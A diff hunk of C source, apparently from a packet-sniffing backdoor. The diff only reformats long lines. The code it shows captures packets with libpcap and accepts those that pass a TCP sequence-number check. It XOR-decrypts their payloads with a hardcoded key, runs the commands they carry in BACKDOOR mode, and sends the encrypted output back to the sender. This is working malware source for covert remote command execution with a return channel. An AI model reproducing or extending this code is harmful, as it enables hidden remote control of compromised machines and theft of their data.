@@ -60,13 +60,12 @@ char **execute_command(const char *command, int *size)
  *
  *       u_char* packet: Pointer to the captured packet in serialized form.
  */
-void got_packet(u_char *args, const struct pcap_pkthdr *header,
-                const u_char *packet)
+void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
     char ip_str_local[INET_ADDRSTRLEN];
     char ip_str_recv[INET_ADDRSTRLEN];
 
-    struct handler_args *pargs = (struct handler_args*)args;
+    struct handler_args *pargs = (struct handler_args *)args;
     Mode mode = pargs->mode;
     struct in_addr this_ip = pargs->address;
 
@@ -101,15 +100,13 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
     payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
     size_payload = ntohs(ip->ip_len) - size_ip - size_tcp;
 
-
     // Step 2: Authenticate the packet
     if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
     {
         // printf("Inauthentic packet:\n Source port: %u\n, Seqnum: %u\n", tcp_sport, tcp_seqnum);
         return;
     }
-    printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n",
-           tcp_sport, tcp_seqnum);
+    printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);
 
     inet_ntop(AF_INET, &this_ip.s_addr, ip_str_local, INET_ADDRSTRLEN);
     inet_ntop(AF_INET, &ip->ip_src.s_addr, ip_str_recv, INET_ADDRSTRLEN);
@@ -122,8 +119,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
     }
 
     // Step 3: Decrypt the payload
-    xor_bytes(XOR_KEY, strlen(XOR_KEY), payload, decrypted,
-              size_payload);
+    xor_bytes(XOR_KEY, strlen(XOR_KEY), payload, decrypted, size_payload);
 
     if (mode == BACKDOOR)
     {
@@ -187,10 +183,8 @@ void backdoor_mode(const char *decrypted, const struct in_addr this_ip, const st
 
     // Step 6: Send the results back
     encrypted_command_output = malloc(total_size);
-    xor_bytes(XOR_KEY, strlen(XOR_KEY), command_output,
-              encrypted_command_output, total_size);
-    send_message_to_ip(this_ip, address, SERVER_PORT, encrypted_command_output,
-                       total_size);
+    xor_bytes(XOR_KEY, strlen(XOR_KEY), command_output, encrypted_command_output, total_size);
+    send_message_to_ip(this_ip, address, SERVER_PORT, encrypted_command_output, total_size);
 
     free(encrypted_command_output);
     // free command_output which was malloced by
